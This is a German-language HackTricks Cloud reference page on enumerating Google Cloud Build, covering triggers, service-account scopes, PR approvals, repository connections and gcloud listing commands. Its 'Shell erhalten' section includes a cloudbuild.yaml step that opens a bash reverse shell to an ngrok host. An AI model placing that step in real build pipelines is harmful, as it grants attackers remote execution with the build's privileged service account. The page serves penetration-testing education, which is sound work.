# GCP - Cloud Build Enum

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Grundlegende Informationen

Google Cloud Build ist eine verwaltete CI/CD-Plattform, die **Software-Build- und Release-Prozesse automatisiert**, indem sie sich in **Quellcode-Repositories** integriert und eine breite Palette von Programmiersprachen unterst√ºtzt. Sie **erm√∂glicht es Entwicklern, Code automatisch zu bauen, zu testen und bereitzustellen**, w√§hrend sie Flexibilit√§t bietet, um Build-Schritte und Workflows anzupassen.

Jeder Cloud Build Trigger ist **mit einem Cloud Repository oder direkt mit einem externen Repository** (Github, Bitbucket und Gitlab) verbunden.

{% hint style="success" %}
Ich konnte keine M√∂glichkeit finden, das Github/Bitbucket-Token von hier oder von Cloud Repositories zu stehlen, da beim Herunterladen des Repos √ºber eine [https://source.cloud.google.com/](https://source.cloud.google.com/) URL zugegriffen wird und Github nicht vom Client aus aufgerufen wird.
{% endhint %}

### Ereignisse

Der Cloud Build kann ausgel√∂st werden, wenn:

* **Push zu einem Branch**: Branch angeben
* **Push eines neuen Tags**: Tag angeben
* **Pull-Request**: Branch angeben, der den PR erh√§lt
* **Manuelle Ausf√ºhrung**
* **Pub/Sub-Nachricht:** Thema angeben
* **Webhook-Ereignis**: Wird eine HTTPS-URL bereitstellen und die Anfrage muss mit einem Geheimnis authentifiziert werden

### Ausf√ºhrung

Es gibt 3 Optionen:

* Eine yaml/json **spezifiziert die auszuf√ºhrenden Befehle**. Normalerweise: `/cloudbuild.yaml`
* Nur eine, die ‚Äûinline‚Äú in der Webkonsole und im CLI angegeben werden kann
* H√§ufigste Option
* Relevant f√ºr nicht authentifizierten Zugriff
* Eine **Dockerfile** zum Bauen
* Ein **Buildpack** zum Bauen

### SA-Berechtigungen

Das **Service-Konto hat den `cloud-platform`-Bereich**, sodass es **alle Privilegien nutzen kann.** Wenn **kein SA angegeben ist** (wie beim Einreichen), wird das **Standard-SA** `<proj-number>@cloudbuild.gserviceaccount.com` **verwendet.**

Standardm√§√üig werden keine Berechtigungen vergeben, aber es ist ziemlich einfach, ihm welche zu geben:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Genehmigungen

Es ist m√∂glich, einen Cloud Build so zu konfigurieren, dass **Genehmigungen f√ºr Build-Ausf√ºhrungen erforderlich sind** (standardm√§√üig deaktiviert).

### PR-Genehmigungen

Wenn der Trigger ein PR ist, da **jeder PRs zu √∂ffentlichen Repositories durchf√ºhren kann**, w√§re es sehr gef√§hrlich, einfach **die Ausf√ºhrung des Triggers mit jedem PR zuzulassen**. Daher wird die Ausf√ºhrung standardm√§√üig nur **automatisch f√ºr Besitzer und Mitarbeiter** sein, und um den Trigger mit PRs anderer Benutzer auszuf√ºhren, muss ein Besitzer oder Mitarbeiter den Kommentar `/gcbrun` abgeben.

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### Verbindungen & Repositories

Verbindungen k√∂nnen √ºber erstellt werden:

* **GitHub:** Es wird ein OAuth-Prompt angezeigt, der um Berechtigungen bittet, um **ein Github-Token zu erhalten**, das im **Secret Manager** gespeichert wird.
* **GitHub Enterprise:** Es wird darum gebeten, eine **GithubApp** zu installieren. Ein **Authentifizierungstoken** von Ihrem GitHub Enterprise-Host wird erstellt und in diesem Projekt als **Secret Manager**-Geheimnis gespeichert.
* **GitLab / Enterprise:** Sie m√ºssen **das API-Zugriffstoken und das Read-API-Zugriffstoken bereitstellen**, die im **Secret Manager** gespeichert werden.

Sobald eine Verbindung hergestellt ist, k√∂nnen Sie sie verwenden, um **Repositories zu verkn√ºpfen, auf die das Github-Konto Zugriff hat**.

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Beachten Sie, dass Repositories, die mit dieser Methode verbunden sind, **nur in Triggers der 2. Generation verf√ºgbar sind.**
{% endhint %}

### Ein Repository verbinden

Dies ist nicht dasselbe wie eine **`Verbindung`**. Dies erm√∂glicht **verschiedene** M√∂glichkeiten, **Zugriff auf ein Github- oder Bitbucket-Repository zu erhalten**, erzeugt jedoch kein Verbindungsobjekt, sondern ein Repository-Objekt (der 1. Generation).

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Speicher

Manchmal wird Cloud Build **einen neuen Speicher generieren, um die Dateien f√ºr den Trigger zu speichern**. Dies geschieht beispielsweise in dem Beispiel, das GCP anbietet mit:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Ein Storage-Bucket namens [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) wird erstellt, um eine `.tgz` mit den zu verwendenden Dateien zu speichern.

### Shell erhalten
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
Installiere gcloud innerhalb von Cloud Build:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

Sie k√∂nnten **sensible Informationen in Build-Konfigurationen und Protokollen** finden.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Privilegieneskalation

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Unauthentifizierter Zugriff

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post-Exploitation

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
